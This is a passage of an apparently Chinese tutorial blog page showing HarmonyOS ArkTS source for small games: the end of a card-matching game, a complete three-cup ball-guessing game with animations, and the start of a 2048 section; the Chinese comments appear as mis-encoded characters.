class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">firstSelectedIndex</span> == index) &#123; <span class="comment">// å¦‚æœä¸ç¬¬ä¸€æ¬¡é€‰æ‹©ç›¸åŒ</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;å’Œä¸Šä¸€æ¬¡ç‚¹å‡»çš„æ˜¯ä¸€æ ·çš„ï¼Œä¸äºˆå¤„ç†&quot;</span>); <span class="comment">// æ‰“å°ä¿¡æ¯</span></span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> == <span class="literal">null</span>) &#123; <span class="comment">// å¦‚æœæ²¡æœ‰ç¬¬äºŒæ¬¡é€‰æ‹©</span></span><br><span class="line">                <span class="variable language_">this</span>.<span class="property">secondSelectedIndex</span> = index; <span class="comment">// è®¾ç½®ç¬¬äºŒæ¬¡é€‰æ‹©ç´¢å¼•</span></span><br><span class="line">                <span class="keyword">if</span> (!gameCell.<span class="property">isFrontVisible</span>) &#123; <span class="comment">// å¦‚æœä¸æ˜¯æ­£é¢æœä¸Š</span></span><br><span class="line">                  gameCell.<span class="title function_">revealFace</span>(<span class="variable language_">this</span>.<span class="property">transitionDuration</span>, <span class="function">() =&gt;</span> &#123; <span class="comment">// å±•ç¤ºæ­£é¢</span></span><br><span class="line">                    <span class="variable language_">this</span>.<span class="title function_">checkForMatch</span>(); <span class="comment">// æ£€æŸ¥æ˜¯å¦åŒ¹é…</span></span><br><span class="line">                  &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;(<span class="variable language_">this</span>.cellSize + <span class="variable language_">this</span>.cellSpacing * <span class="number">2</span>) * <span class="number">4</span>&#125;</span>lpx`</span>); <span class="comment">// è®¾ç½®å®½åº¦</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;é‡æ–°å¼€å§‹&#x27;</span>) <span class="comment">// åˆ›å»ºâ€œé‡æ–°å¼€å§‹â€æŒ‰é’®</span></span><br><span class="line">        .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123; <span class="comment">// æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">shuffleCards</span>(); <span class="comment">// é‡æ–°å¼€å§‹æ¸¸æˆ</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>); <span class="comment">// è®¾ç½®é«˜åº¦å’Œå®½åº¦</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3cup-ball"><a href="#3cup-ball" class="headerlink" title="3cup  ball"></a>3cup  ball</h1><p>ä¸‰æ¯çŒœçƒ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨è£…é¥°å™¨æ¥è¿½è¸ªå¯¹è±¡çš„å˜åŒ–</span></span><br><span class="line">@<span class="title class_">ObservedV2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cup</span> &#123;</span><br><span class="line">  <span class="comment">// ä½¿ç”¨è£…é¥°å™¨æ¥è¿½è¸ªå±æ€§çš„å˜åŒ–</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">positionX</span>: number; <span class="comment">// æ¯å­çš„Xè½´ä½ç½®</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">positionY</span>: number; <span class="comment">// æ¯å­çš„Yè½´ä½ç½®</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">containsBall</span>: boolean; <span class="comment">// æ¯å­å†…æ˜¯å¦æœ‰çƒ</span></span><br><span class="line">  @<span class="title class_">Trace</span> <span class="attr">isRevealed</span>: boolean; <span class="comment">// æ¯å­æ˜¯å¦æ‰“å¼€</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–æ¯å­çš„çŠ¶æ€</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">hasBall: boolean</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">positionX</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">positionY</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">containsBall</span> = hasBall;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isRevealed</span> = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// æ¸¸æˆå…¥å£ç»„ä»¶</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">ThreeCupGame</span> &#123;</span><br><span class="line">  <span class="comment">// æ¸¸æˆçŠ¶æ€å˜é‡</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">gameCups</span>: <span class="title class_">Cup</span>[] = [<span class="comment">// åˆå§‹åŒ–ä¸‰ä¸ªæ¯å­ï¼Œå…¶ä¸­ä¸€ä¸ªæœ‰çƒ</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">true</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">false</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Cup</span>(<span class="literal">false</span>)</span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cupWidth</span>: number = <span class="number">200</span>; <span class="comment">// æ¯å­å®½åº¦</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">cupSpacing</span>: number = <span class="number">10</span>; <span class="comment">// æ¯å­ä¹‹é—´çš„é—´è·</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">animationDurationMs</span>: number = <span class="number">140</span>; <span class="comment">// åŠ¨ç”»æŒç»­æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">isGameAnimating</span>: boolean = <span class="literal">false</span>; <span class="comment">// æ˜¯å¦æ­£åœ¨åŠ¨ç”»ä¸­</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">mixingCount</span>: number = <span class="number">5</span>; <span class="comment">// æ¯å±€æ¸¸æˆæ··åˆæ¬¡æ•°</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentMixingCount</span>: number = <span class="number">0</span>; <span class="comment">// å½“å‰æ­£åœ¨è¿›è¡Œçš„æ··åˆæ¬¡æ•°è®¡æ•°</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¼€å§‹æ¸¸æˆçš„æ–¹æ³•</span></span><br><span class="line">  <span class="title function_">startGame</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentMixingCount</span>--; <span class="comment">// å‡å°‘æ··åˆæ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">const</span> cupPairs = [[<span class="number">0</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>]]; <span class="comment">// å¯èƒ½çš„æ¯å­å¯¹ç»„åˆ</span></span><br><span class="line">    <span class="keyword">const</span> selectedPair = cupPairs[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * cupPairs.<span class="property">length</span>)]; <span class="comment">// éšæœºé€‰æ‹©ä¸€å¯¹</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">moveCups</span>(selectedPair[<span class="number">0</span>], selectedPair[<span class="number">1</span>]); <span class="comment">// å¼€å§‹ç§»åŠ¨é€‰å®šçš„ä¸¤ä¸ªæ¯å­</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// ç§»åŠ¨æŒ‡å®šçš„ä¸¤ä¸ªæ¯å­</span></span><br><span class="line">  <span class="title function_">moveCups</span>(<span class="params">cupIndex1: number, cupIndex2: number</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="attr">direction</span>: number = <span class="title class_">Math</span>.<span class="title function_">random</span>() &lt; <span class="number">0.5</span> ? -<span class="number">1</span> : <span class="number">1</span>; <span class="comment">// éšæœºæ–¹å‘</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">distanceFactor</span>: number = <span class="title class_">Math</span>.<span class="title function_">abs</span>(cupIndex1 - cupIndex2); <span class="comment">// è·ç¦»å› å­</span></span><br><span class="line">    <span class="keyword">const</span> <span class="attr">adjustedDistanceFactor</span>: number = distanceFactor === <span class="number">1</span> ? <span class="number">2</span> : <span class="number">1</span>; <span class="comment">// æ ¹æ®è·ç¦»è°ƒæ•´å› å­</span></span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = -direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionX</span> = (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = -direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> * <span class="number">2</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionX</span> = (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">positionY</span> = <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span></span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionX</span> = -(<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = direction * (<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) / adjustedDistanceFactor</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">      <span class="attr">delay</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> * <span class="number">2</span>,</span><br><span class="line">      <span class="attr">duration</span>: <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>,</span><br><span class="line">      <span class="attr">onFinish</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">swapBalls</span>(cupIndex1, cupIndex2)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionX</span> = -(<span class="variable language_">this</span>.<span class="property">cupWidth</span> + <span class="variable language_">this</span>.<span class="property">cupSpacing</span> * <span class="number">2</span>) * distanceFactor</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">positionY</span> = <span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// é‡ç½®æ¯å­çš„ä½ç½®</span></span><br><span class="line">  <span class="title function_">resetCupPosition</span>(<span class="params">cupIndex: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex].<span class="property">positionX</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex].<span class="property">positionY</span> = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// äº¤æ¢ä¸¤ä¸ªæ¯å­å†…çš„çƒ</span></span><br><span class="line">  <span class="title function_">swapBalls</span>(<span class="params">cupIndex1: number, cupIndex2: number</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetCupPosition</span>(cupIndex1);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetCupPosition</span>(cupIndex2);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">let</span> temporaryBallStatus = <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">containsBall</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex1].<span class="property">containsBall</span> = <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">containsBall</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">gameCups</span>[cupIndex2].<span class="property">containsBall</span> = temporaryBallStatus;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentMixingCount</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">isGameAnimating</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">startGame</span>();</span><br><span class="line">      &#125;, <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// æ„å»ºæ¸¸æˆç•Œé¢</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>(&#123; <span class="attr">space</span>: <span class="number">20</span> &#125;) &#123;</span><br><span class="line">      <span class="comment">// æ¸¸æˆæ ‡é¢˜</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">&#x27;çŒœå°çƒæ¸¸æˆ&#x27;</span>)</span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="number">24</span>)</span><br><span class="line">        .<span class="title function_">margin</span>(&#123; <span class="attr">top</span>: <span class="number">20</span> &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// åŠ¨ç”»é€Ÿåº¦æ§åˆ¶å™¨</span></span><br><span class="line">      <span class="title class_">Counter</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`å½“å‰é€Ÿåº¦<span class="subst">$&#123;<span class="variable language_">this</span>.animationDurationMs&#125;</span>æ¯«ç§’`</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;26lpx&#x27;</span>);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>).<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> += <span class="number">10</span>;</span><br><span class="line">      &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> -= <span class="number">10</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> = <span class="variable language_">this</span>.<span class="property">animationDurationMs</span> &lt; <span class="number">10</span> ? <span class="number">10</span> : <span class="variable language_">this</span>.<span class="property">animationDurationMs</span>;</span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ··åˆæ¬¡æ•°æ§åˆ¶å™¨</span></span><br><span class="line">      <span class="title class_">Counter</span>() &#123;</span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`æ¯å±€æ··åˆ<span class="subst">$&#123;<span class="variable language_">this</span>.mixingCount&#125;</span>æ¬¡`</span>)</span><br><span class="line">          .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">Black</span>)</span><br><span class="line">          .<span class="title function_">fontSize</span>(<span class="string">&#x27;26lpx&#x27;</span>);</span><br><span class="line">      &#125;.<span class="title function_">width</span>(<span class="string">&#x27;400lpx&#x27;</span>).<span class="title function_">onInc</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> += <span class="number">1</span>;</span><br><span class="line">      &#125;).<span class="title function_">onDec</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> -= <span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mixingCount</span> = <span class="variable language_">this</span>.<span class="property">mixingCount</span> &lt; <span class="number">1</span> ? <span class="number">1</span> : <span class="variable language_">this</span>.<span class="property">mixingCount</span></span><br><span class="line">      &#125;);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// æ¯å­å¸ƒå±€</span></span><br><span class="line">      <span class="title class_">Row</span>() &#123;</span><br><span class="line">        <span class="title class_">ForEach</span>(<span class="variable language_">this</span>.<span class="property">gameCups</span>, <span class="function">(<span class="params">cup: Cup</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title class_">Text</span>(cup.<span class="property">isRevealed</span> ? (cup.<span class="property">containsBall</span> ? <span class="string">&#x27;å°çƒ&#x27;</span> : <span class="string">&#x27;ç©º&#x27;</span>) : <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            .<span class="title function_">width</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">height</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">margin</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupSpacing&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Orange</span>)</span><br><span class="line">            .<span class="title function_">fontSize</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.cupWidth / <span class="number">4</span>&#125;</span>lpx`</span>)</span><br><span class="line">            .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>)</span><br><span class="line">            .<span class="title function_">fontColor</span>(<span class="title class_">Color</span>.<span class="property">White</span>)</span><br><span class="line">            .<span class="title function_">borderRadius</span>(<span class="number">5</span>)</span><br><span class="line">            .<span class="title function_">translate</span>(&#123; <span class="attr">x</span>: <span class="string">`<span class="subst">$&#123;cup.positionX&#125;</span>lpx`</span>, <span class="attr">y</span>: <span class="string">`<span class="subst">$&#123;cup.positionY&#125;</span>lpx`</span> &#125;)</span><br><span class="line">            .<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">              <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameAnimating</span>) &#123;</span><br><span class="line">                cup.<span class="property">isRevealed</span> = <span class="literal">true</span>;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;.<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>).<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;720lpx&#x27;</span>).<span class="title function_">backgroundColor</span>(<span class="title class_">Color</span>.<span class="property">Gray</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// å¼€å§‹æ¸¸æˆæŒ‰é’®</span></span><br><span class="line">      <span class="title class_">Button</span>(<span class="string">&#x27;å¼€å§‹æ¸¸æˆ&#x27;</span>).<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">isGameAnimating</span>) &#123;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">currentMixingCount</span> = <span class="variable language_">this</span>.<span class="property">mixingCount</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">isGameAnimating</span> = <span class="literal">true</span>;</span><br><span class="line">          <span class="variable language_">this</span>.<span class="property">gameCups</span>.<span class="title function_">forEach</span>(<span class="function"><span class="params">cup</span> =&gt;</span> cup.<span class="property">isRevealed</span> = <span class="literal">false</span>);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">startGame</span>();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>).<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span 